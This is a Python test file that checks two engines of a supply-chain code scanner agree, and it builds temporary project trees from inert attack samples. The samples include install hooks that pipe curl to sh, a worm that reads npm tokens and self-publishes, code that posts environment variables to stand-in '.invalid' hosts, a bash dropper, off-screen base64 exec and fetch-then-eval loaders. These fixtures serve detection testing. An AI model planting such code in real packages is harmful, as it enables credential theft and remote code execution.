"""Engine parity for the project-scan robustness and report-integrity fixes.

Same comparison as test_js_parity (the helpers are imported from there): both
CLIs scan the same tree and must report the same findings, metrics, ratings,
gate and exit code. These trees are the review's reproductions; where a fix
is about what a snippet shows (redaction), the snippets are compared too.
All content is inert: nothing is executed, hosts are TEST-NET (192.0.2.x) or
.invalid, credentials are dummies. Skipped where Node isn't installed.
"""

import collections
import contextlib
import json
import os
import subprocess
import tempfile
import unittest

from tests.architecture import test_js_parity as parity

SEED = "q8Zr2LmX0vB7nTg4Wk1pYc9Hs6Jd3Fe5DUMMYVALUE9"
PEM_BODY = "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun"


@contextlib.contextmanager
def tree(files):
    """A temporary directory holding `files` (relative path -> str or bytes)."""
    with tempfile.TemporaryDirectory() as root:
        for rel, data in files.items():
            path = os.path.join(root, *rel.split("/"))
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "wb") as f:
                f.write(data if isinstance(data, bytes) else data.encode("utf-8"))
        yield root


def snippets(report):
    """Every finding's key with its snippet (the Python-only ones left out)."""
    return collections.Counter(json.dumps([parity.issue_key(i), i["snipStart"], i["snippet"]])
                               for i in report["issues"] if not parity._python_only(i, project=report["project"]))


@unittest.skipUnless(parity.NODE, "node is not installed")
class CoreParityTests(unittest.TestCase):
    maxDiff = None
    assert_same = parity.EngineParityTests.assert_same

    def test_redaction_of_findings_built_outside_the_file_scan(self):
        files = {
            "settings.py": b"\xef\xbb\xbf# service settings\nSEED = \"" + SEED.encode() + b"\"\nDEBUG_LEVEL = 1\n",
            "u7.py": b"# -*- coding: utf-7 -*-\nSEED = \"" + SEED.encode() + b"\"\nx = 1\n",
            "keys.js": b"\xff\xfe" + ('const k = "-----BEGIN RSA PRIVATE KEY-----\n' + PEM_BODY + "\n" + PEM_BODY
                                      + '\n-----END RSA PRIVATE KEY-----";\n').encode("utf-16-le"),
            "app.py": ("import os\nfrom flask import request\n\n\ndef run(cmd):\n    os.system(cmd)\n\n\n"
                       "def view():\n    seed = \"" + SEED + "\"\n    run(request.args.get(\"c\"))\n"),
        }
        with tree(files) as root:
            js, py = parity.both(root)
            self.assert_same(js, py, label="redaction")
            self.assertEqual(snippets(js[1]), snippets(py[1]))
            for engine, (_, report, _) in (("js", js), ("py", py)):
                self.assertNotIn(SEED, json.dumps(report), engine)
                self.assertNotIn(PEM_BODY, json.dumps(report), engine)
            self.assertIn("X-CMD", {i["rule"] for i in py[1]["issues"]})

    def test_gyp_includes_and_pyw_sources(self):
        files = {
            "binding.gyp": "{\n  'includes': ['build/common.gypi'],\n  'targets': [{'target_name': 'addon'}]\n}\n",
            "build/common.gypi": ("{\n  'target_defaults': {\n    'actions': [{\n      'action_name': 'marker',\n"
                                  "      'action': ['sh', '-c', 'curl http://192.0.2.1/marker.txt -o out.txt'],\n"
                                  "    }],\n  },\n}\n"),
            "tools/gen.gyp": "{'variables': {'x': '<!(curl -s http://192.0.2.1/v)'}}\n",
            "deps/UPPER.GYPI": "{'targets': [{'actions': [{'action': ['python', 'gen.py']}]}]}\n",
            "broken.gypi": "{'targets': [",
            "tool.pyw": "import os\nos.system(user_cmd)  # marker\n",
            "node_modules/native/binding.gyp": "{'targets': [{'actions': [{'action': ['node', 'x.js']}]}]}\n",
            "node_modules/native/common.gypi": "{'variables': {'y': '<!(wget http://192.0.2.1/y)'}}\n",
        }
        with tree(files) as root:
            for deps in (False, True):
                js, py = parity.both(root, deps=deps, extra=("--ci",))
                with self.subTest(deps=deps):
                    self.assert_same(js, py, label=f"gyp/pyw deps={deps}")
                    found = {(i["rule"], i["file"].replace("\\", "/")) for i in py[1]["issues"]}
                    self.assertIn(("SC-INSTALL-HOOK", "build/common.gypi"), found)
                    self.assertIn(("S-OSCMD-PY", "tool.pyw"), found)
                    self.assertEqual(deps, ("SC-INSTALL-HOOK", "node_modules/native/common.gypi") in found)
                    self.assertEqual((js[0], py[0]), (1, 1))


    def test_pth_lines_split_both_ways(self):
        seps = ["\v", "\f", "\x1c", "\x1d", "\x1e", "\x85", "\u2028", "\u2029"]
        files = {f"s{n}.pth": f'# path notes{sep}import sys; print("PTH-MARKER-{n}")\n' for n, sep in enumerate(seps)}
        files["mixed.pth"] = ("./lib\r\nx\x85import zlib; zlib.decompress(b)\n./a\u2028./b\n"
                              "import os\f./c\n# a\vimport a\x1cimport b\nimports\x1dimportlib\n")
        files["bom.pth"] = b"\xef\xbb\xbf# x\x0cimport os; exec(s)\r\n"
        with tree(files) as root:
            js, py = parity.both(root)
            self.assert_same(js, py, label="pth")
            self.assertEqual(snippets(js[1]), snippets(py[1]))
            self.assertEqual(len([i for i in py[1]["issues"] if i["rule"] == "SC-PTH-EXEC"]), len(seps) + 4)

    def test_surrogates_left_by_a_utf7_cookie(self):
        files = {"a.py": b'# -*- coding: utf-7 -*-\nx = "+2AA-"  # TODO marker\n',
                 "b.py": b"# coding: utf-7\n+2D3eAA- +3gA- +2D3YPQ- +2ADYAA-\nimport os\nos.system(c)\n"}
        with tree(files) as root:
            js, py = parity.both(root, extra=("--ci",))
            self.assert_same(js, py, label="surrogates")
            self.assertEqual(snippets(js[1]), snippets(py[1]))
            self.assertEqual((js[0], py[0]), (1, 1))
            (todo,) = [i for i in py[1]["issues"] if i["rule"] == "Q-TODO"]
            self.assertEqual(todo["snippet"][1], 'x = "\ufffd"  # TODO marker')

    def test_capped_findings_count_in_the_rating(self):
        table = "".join(f'value_{n:04d} = "' + f"segment-{n:04d} " * 14 + '"\n' for n in range(2000))
        catches = "try { f() } catch (e) {}\n" * 300 + "// TODO later\n" * 15
        for label, files in (("smells", {"table.py": table}), ("bugs", {"c.js": catches}),
                             ("both", {"table.py": table, "c.js": catches, "t.py": "# TODO x\n" * 260})):
            with self.subTest(tree=label), tree(files) as root:
                js, py = parity.both(root, extra=("--ci",))
                self.assert_same(js, py, label=f"cap rating {label}")
                capped = lambda r: sorted((i["file"], i["omitted"], i["omittedType"])
                                          for i in r["issues"] if i["rule"] == "Q-CAPPED")
                self.assertEqual(capped(js[1]), capped(py[1]))
                self.assertEqual(py[1]["ratings"]["maintainability"], {"smells": "E", "bugs": "A", "both": "E"}[label])

    def test_install_hook_lines(self):
        dependency = ('{\n  "name": "x",\n  "dependencies": {\n    "install": "^1.0.0"\n  },\n'
                      '  "scripts": {\n    "install": "node-gyp rebuild"\n  }\n}\n')
        tricky = ('{"description": "run \\"postinstall\\" first", "scripts": {"test": "x"},\n'
                  '"config": {"scripts": {"postinstall": "no"}},\n'
                  '"scripts": {\n"post\\u0069nstall": "curl http://192.0.2.1/x | sh",\n "prepare": "a",\n'
                  '"prepare": "husky install"}, "x": [{"install": 1}]}\n')
        files = {"package.json": dependency, "tricky/package.json": tricky,
                 "bom/package.json": b"\xef\xbb\xbf" + dependency.replace("\n", "\r\n").encode(),
                 "node_modules/dep/package.json": dependency, "index.js": "module.exports = 1;\n"}
        with tree(files) as root:
            for deps in (False, True):
                js, py = parity.both(root, deps=deps)
                with self.subTest(deps=deps):
                    self.assert_same(js, py, label=f"hook lines deps={deps}")
                    self.assertEqual(snippets(js[1]), snippets(py[1]))
                    lines = sorted((i["file"].replace("\\", "/"), i["line"]) for i in py[1]["issues"]
                                   if i["rule"] == "SC-INSTALL-HOOK")
                    want = [("bom/package.json", 7), ("package.json", 7), ("tricky/package.json", 4),
                            ("tricky/package.json", 6)] + ([("node_modules/dep/package.json", 7)] if deps else [])
                    self.assertEqual(lines, sorted(want))

    def test_self_publishing_offscreen_code_and_install_time_publishing(self):
        """0.1.8: SC-SELF-PUBLISH, SC-OFFSCREEN-CODE, and a dependency's install
        hook that runs a script publishing, collecting npm tokens or running a
        DLL (dependency_checks, with --deps)."""
        spam = ("const fs = require('fs');\nconst { exec } = require('child_process');\nlet packageData = {};\n"
                "packageData.name = `${pick()}-sluey`;\n"
                "fs.writeFileSync('package.json', JSON.stringify(packageData, null, 2));\n"
                "exec('npm publish --access public', () => {});\n")
        spam_py = ("import json, subprocess\npkg = json.load(open('package.json'))\npkg['name'] = 'x-' + str(n)\n"
                   "with open('package.json', 'w') as f:\n    json.dump(pkg, f)\nsubprocess.run(['npm', 'publish'])\n")
        release = ("const fs = require('fs');\nconst { execSync } = require('child_process');\npkg.version = next;\n"
                   "fs.writeFileSync('package.json', JSON.stringify(pkg));\nexecSync('npm publish');\n")
        hidden = ("module.exports = 1;\n});" + " " * 300 + "global['r']=require;(function(){r('https')})();\n"
                  "const a = 2;" + " " * 200 + "a.b = [1, 2];\n")
        hidden_py = "x = 1\n)" + " " * 515 + ";import base64;exec(base64.b64decode('cHJpbnQoMSk='))\n"
        worm = ("const rc = require('fs').readFileSync(require('path').join(require('os').homedir(), '.npmrc'), 'utf8');\n"
                "const m = rc.match(/:_authToken=([^\\s]+)/);\nrequire('child_process').execSync('npm publish');\n")
        dll = ("require('chi'+'ld_pro'+'cess')[\"sp\"+\"awn\"](\"rund\"+\"ll32\", "
               "[require('path').join(__dirname, './node-gyp' + '.dll') + \",main\"]);\n")
        hook = lambda script: json.dumps({"name": "dep", "version": "1.0.0", "scripts": {"postinstall": f"node {script}"}})
        files = {"package.json": json.dumps({"name": "app", "version": "1.0.0"}), "spam/auto.js": spam,
                 "tools/publish.py": spam_py, "tools/release.js": release, "lib/index.js": hidden,
                 "lib/setup_helper.py": hidden_py,
                 "node_modules/worm/package.json": hook("index.js"), "node_modules/worm/index.js": worm,
                 "node_modules/dllrun/package.json": hook("install.js"), "node_modules/dllrun/install.js": dll}
        with tree(files) as root:
            for deps in (False, True):
                js, py = parity.both(root, deps=deps)
                with self.subTest(deps=deps):
                    self.assert_same(js, py, label=f"0.1.8 rules deps={deps}")
                    self.assertEqual(snippets(js[1]), snippets(py[1]))
                    found = sorted((i["rule"], i["file"].replace("\\", "/"), i["line"], i["sev"])
                                   for i in py[1]["issues"]
                                   if i["rule"] in ("SC-SELF-PUBLISH", "SC-OFFSCREEN-CODE")
                                   or (i["rule"] == "SC-INSTALL-HOOK" and i["sev"] == "CRITICAL"))
                    want = [("SC-OFFSCREEN-CODE", "lib/index.js", 2, "CRITICAL"),
                            ("SC-OFFSCREEN-CODE", "lib/index.js", 3, "MAJOR"),
                            ("SC-OFFSCREEN-CODE", "lib/setup_helper.py", 2, "CRITICAL"),
                            ("SC-SELF-PUBLISH", "spam/auto.js", 6, "CRITICAL"),
                            ("SC-SELF-PUBLISH", "tools/publish.py", 6, "CRITICAL")]
                    if deps:
                        want += [("SC-INSTALL-HOOK", "node_modules/dllrun/package.json", 1, "CRITICAL"),
                                 ("SC-INSTALL-HOOK", "node_modules/worm/package.json", 1, "CRITICAL")]
                    self.assertEqual(found, sorted(want))
                    if deps:
                        msgs = {i["file"].replace("\\", "/"): i["msg"] for i in py[1]["issues"]
                                if i["rule"] == "SC-INSTALL-HOOK" and i["sev"] == "CRITICAL"}
                        self.assertEqual(msgs["node_modules/worm/package.json"],
                                         "Install hook runs index.js, which publishes a package to a registry "
                                         "(npm publish); and collects npm access tokens.")
                        self.assertEqual(msgs["node_modules/dllrun/package.json"],
                                         "Install hook runs install.js, which runs a DLL with rundll32 or regsvr32 "
                                         "(node-gyp.dll).")

    def test_decoded_names_started_scripts_and_the_eval_decoder(self):
        """0.1.8 (items 5 and 6): SC-EVAL-DECODER, a dependency's install hook
        that starts another script of the package (followed to it), names in
        strings an install script decodes, a script it downloads and runs
        with bash, and the received-code forms (Function.constructor, rows
        joined, environment variables) in a dependency's import-time code."""
        codes = ",".join(str(40 + (k % 80)) for k in range(260))
        caesar = ("try{eval(function(s,n){return s.replace(/[a-zA-Z]/g,function(c){var b=c<=\"Z\"?65:97;"
                  "return String.fromCharCode((c.charCodeAt(0)-b+n)%26+b)})}([" + codes + "],17))}catch(e){}\n")
        starter = ("const { spawn } = require('child_process');\nconst path = require('path');\n"
                   "const filePath = path.join(__dirname, 'worker/run.js');\n"
                   "spawn(process.execPath, [filePath], { detached: true, stdio: 'ignore' }).unref();\n")
        worker = ("const https = require('https');\nconst body = JSON.stringify(process.env);\n"
                  "https.request({ host: 'collector.invalid', method: 'POST' }).end(body);\n")
        metrics = ("(() => {\n  const a = require(\n    Buffer.from(\"%s\", \"hex\").toString()\n  );\n"
                   "  const e = Object.keys(process[\"env\"]).map(k => [k, process[\"env\"][k]]);\n"
                   "  a.request({ hostname: 'collector.invalid', method: 'POST' }).end(JSON.stringify(e));\n})();\n"
                   % "https".encode().hex())
        dropper = ("const fs = require('fs');\nconst { spawn } = require('child_process');\n(async () => {\n"
                   "  const r = await fetch('https://files.invalid/s.sh');\n  fs.writeFileSync(f, await r.text());\n"
                   "  spawn('bash', [f]);\n})();\n")
        chained = ("const axios = require('axios');\n(async () => {\n  axios\n    .post('https://c2.invalid/a', { v })\n"
                   "    .then((r) => {\n      new Function.constructor('require', r.data)(require);\n    });\n})();\n")
        hook = lambda script: json.dumps({"name": "dep", "version": "1.0.0", "scripts": {"postinstall": f"node {script}"}})
        files = {"package.json": json.dumps({"name": "app", "version": "1.0.0"}), "vendor/blob.js": caesar,
                 "node_modules/starter/package.json": hook("lib/start.js"), "node_modules/starter/lib/start.js": starter,
                 "node_modules/starter/lib/worker/run.js": worker,
                 "node_modules/metrics/package.json": hook("metrics.js"), "node_modules/metrics/metrics.js": metrics,
                 "node_modules/dropper/package.json": hook("i.js"), "node_modules/dropper/i.js": dropper,
                 "node_modules/chained/package.json": json.dumps({"name": "chained", "version": "1.0.0", "main": "i.js"}),
                 "node_modules/chained/i.js": chained}
        with tree(files) as root:
            for deps in (False, True):
                js, py = parity.both(root, deps=deps)
                with self.subTest(deps=deps):
                    self.assert_same(js, py, label=f"0.1.8 decoded and started deps={deps}")
                    found = sorted((i["rule"], i["file"].replace("\\", "/"), i["sev"]) for i in py[1]["issues"]
                                   if i["rule"] == "SC-EVAL-DECODER" or (i["rule"] in ("SC-INSTALL-HOOK", "SC-IMPORT-RISK")
                                                                          and i["sev"] == "CRITICAL"))
                    want = [("SC-EVAL-DECODER", "vendor/blob.js", "CRITICAL")]
                    if deps:
                        want += [("SC-IMPORT-RISK", "node_modules/chained/i.js", "CRITICAL"),
                                 ("SC-INSTALL-HOOK", "node_modules/dropper/package.json", "CRITICAL"),
                                 ("SC-INSTALL-HOOK", "node_modules/metrics/package.json", "CRITICAL"),
                                 ("SC-INSTALL-HOOK", "node_modules/starter/package.json", "CRITICAL")]
                    self.assertEqual(found, sorted(want))
                    if deps:
                        msgs = {i["file"].replace("\\", "/"): i["msg"] for i in py[1]["issues"]
                                if i["rule"] == "SC-INSTALL-HOOK" and i["sev"] == "CRITICAL"}
                        self.assertEqual(msgs["node_modules/starter/package.json"],
                                         "Install hook runs lib/start.js, which starts lib/worker/run.js, which sends "
                                         "environment variables over the network (the whole environment).")
                        self.assertEqual(msgs["node_modules/dropper/package.json"],
                                         "Install hook runs i.js, which downloads a script and runs it with bash.")
                        self.assertTrue(msgs["node_modules/metrics/package.json"].endswith(
                            "(in strings it decodes as it runs)."), msgs)

    def test_the_cross_file_follower(self):
        """0.1.8 (item 10): the follower runs in both engines' --deps checks
        (it was the Python engine's alone): a value received in one file of a
        package and run in another, npm and Python; a function of another
        file that runs what this one received; and a package that only parses
        what it receives."""
        u = "'https://c2.invalid/p'"
        py_net = "import requests\n\ndef pull():\n    return requests.get(" + u + ").text\n"
        js_net = "function pull() {\n  return fetch(" + u + ").then((r) => r.text());\n}\nmodule.exports = { pull };\n"
        sp = "venv/lib/python3.12/site-packages/"
        files = {"package.json": json.dumps({"name": "app", "version": "1.0.0"}),
                 "node_modules/xf/package.json": json.dumps({"name": "xf", "version": "1.0.0"}),
                 "node_modules/xf/net.js": js_net,
                 "node_modules/xf/run.js": "const { pull } = require('./net');\npull().then((c) => eval(c));\n",
                 "node_modules/xr/package.json": json.dumps({"name": "xr", "version": "1.0.0"}),
                 "node_modules/xr/util.js": "exports.execute = (code) => eval(code);\n",
                 "node_modules/xr/index.js": "const { execute } = require('./util');\n"
                                             "fetch(" + u + ").then((r) => r.text()).then(execute);\n",
                 "node_modules/quiet/package.json": json.dumps({"name": "quiet", "version": "1.0.0"}),
                 "node_modules/quiet/net.js": js_net,
                 "node_modules/quiet/run.js": "const { pull } = require('./net');\npull().then((c) => JSON.parse(c));\n",
                 sp + "xpkg/__init__.py": "from ._net import pull\nexec(pull())\n", sp + "xpkg/_net.py": py_net,
                 sp + "ypkg/__init__.py": "import requests\nfrom .util import run\nrun(requests.get(" + u + ").text)\n",
                 sp + "ypkg/util.py": "def run(code):\n    exec(code)\n"}
        with tree(files) as root:
            for deps in (False, True):
                js, py = parity.both(root, deps=deps)
                with self.subTest(deps=deps):
                    self.assert_same(js, py, label=f"cross-file follower deps={deps}")
                    found = sorted((i["file"].replace("\\", "/"), i["msg"].split("; ")[1].split(" (")[0])
                                   for i in py[1]["issues"] if i["rule"] == "SC-IMPORT-RISK" and "another file" in i["msg"])
                    received = "the value is received in another file of the package"
                    runner = "the function that runs it is in another file of the package"
                    want = [("node_modules/xf/run.js", received), ("node_modules/xr/index.js", runner),
                            (sp + "xpkg/__init__.py", received), (sp + "ypkg/__init__.py", runner)] if deps else []
                    self.assertEqual(found, want)

    def test_report_path_collisions_exit_3_before_the_scan(self):
        with tree({"a.py": "import os\nos.system(cmd)\n"}) as root, tempfile.TemporaryDirectory() as out:
            cases = [("SARIF on the JSON default", ["--sarif", "lazaret-report.json"]),
                     ("JSON and HTML", ["--json", "X", "--html", os.path.join(out, "sub", "..", "X")]),
                     ("HTML and SARIF", ["--no-json", "--html", "r", "--sarif", "./r"])]
            for label, args in cases:
                with self.subTest(case=label):
                    runs = [subprocess.run(cmd + ["--out-dir", out, *args], capture_output=True, encoding="utf-8",
                                           errors="replace", timeout=parity.CLI_TIMEOUT)
                            for cmd in (parity.js_cmd(root), parity.py_cmd(root))]
                    self.assertEqual([r.returncode for r in runs], [3, 3], [r.stderr for r in runs])
                    for r in runs:
                        self.assertIn("reports would both be written to", r.stderr)
                        self.assertNotIn("Lazaret scan", r.stdout)
                    self.assertEqual(os.listdir(out), [])

    def test_a_closed_stdout_changes_nothing(self):
        many = "import os\n" + "".join(f"os.system(cmd_{n})\n" for n in range(1500))

        def to_closed_pipe(cmd):
            with tempfile.TemporaryDirectory() as out:
                r, w = os.pipe()
                os.close(r)                              # the reader is gone before the first write
                try:
                    p = subprocess.run(cmd + ["--out-dir", out, "--ci"], stdout=w, stderr=subprocess.PIPE,
                                       encoding="utf-8", errors="replace", timeout=parity.CLI_TIMEOUT)
                finally:
                    os.close(w)
                self.assertTrue(os.path.exists(os.path.join(out, "lazaret-report.html")), p.stderr)
                with open(os.path.join(out, "lazaret-report.json"), encoding="utf-8") as f:
                    return p.returncode, json.load(f), p.stderr

        with tree({"many.py": many}) as root:
            js, py = to_closed_pipe(parity.js_cmd(root)), to_closed_pipe(parity.py_cmd(root))
            self.assert_same(js, py, label="closed stdout")
            self.assertEqual((js[0], py[0]), (1, 1))
            self.assert_same(js, parity.run_cli(parity.js_cmd(root), ("--ci",)), label="js, closed or not")

if __name__ == "__main__":
    unittest.main()
